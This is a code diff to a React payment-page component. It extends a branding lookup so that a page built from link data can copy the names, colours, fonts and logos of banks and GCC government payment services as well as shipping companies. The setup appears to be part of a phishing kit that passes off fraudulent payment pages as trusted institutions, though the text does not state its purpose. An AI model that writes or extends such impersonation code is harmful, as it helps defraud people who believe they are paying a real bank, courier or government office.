@@ -5,7 +5,9 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { shippingCompanyBranding } from "@/lib/brandingSystem";
+import { getBrandingByCompany, shippingCompanyBranding, governmentPaymentBranding } from "@/lib/brandingSystem";
+import { banks } from "@/lib/banks";
+import { governmentServices } from "@/lib/gccGovernmentServices";
 import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
@@ -60,7 +62,23 @@ const PaymentRecipient: React.FC<PaymentRecipientProps> = ({ children }) => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
-  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
+  
+  // دعم شامل لجميع أنواع الكيانات: شحن، بنوك، حكوميات
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] 
+    || governmentPaymentBranding[serviceKey.toLowerCase()] 
+    || (banks.find(b => b.id === serviceKey.toLowerCase()) ? {
+      id: serviceKey.toLowerCase(),
+      nameEn: banks.find(b => b.id === serviceKey.toLowerCase())?.name || serviceKey,
+      nameAr: banks.find(b => b.id === serviceKey.toLowerCase())?.name_ar || serviceKey,
+      colors: { primary: banks.find(b => b.id === serviceKey.toLowerCase())?.color || '#006C35', secondary: '#FFFFFF', background: '#FFFFFF', surface: '#F9FAFB', text: '#1A1A1A', textLight: '#666666', textOnPrimary: '#FFFFFF', border: '#E5E5E5' },
+      fonts: { primary: 'Inter, sans-serif', secondary: 'Cairo, sans-serif', arabic: 'Cairo, sans-serif' },
+      gradients: { primary: 'linear-gradient(135deg, #006C35, #004D27)', secondary: 'linear-gradient(135deg, #00843D, #006C35)', hero: 'linear-gradient(to right, #006C35 0%, #00843D 100%)' },
+      shadows: { sm: '0 1px 2px 0 rgba(0, 108, 53, 0.08)', md: '0 4px 6px -1px rgba(0, 108, 53, 0.15)', lg: '0 10px 15px -3px rgba(0, 108, 53, 0.20)' },
+      borderRadius: { sm: '4px', md: '8px', lg: '12px' },
+      logoUrl: `/images/brand-logos/${serviceKey.toLowerCase()}.svg`,
+      description: `Payment for ${serviceKey}`
+    } : null);
+  
   const companyMeta = getCompanyMeta(serviceKey);
 
   const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
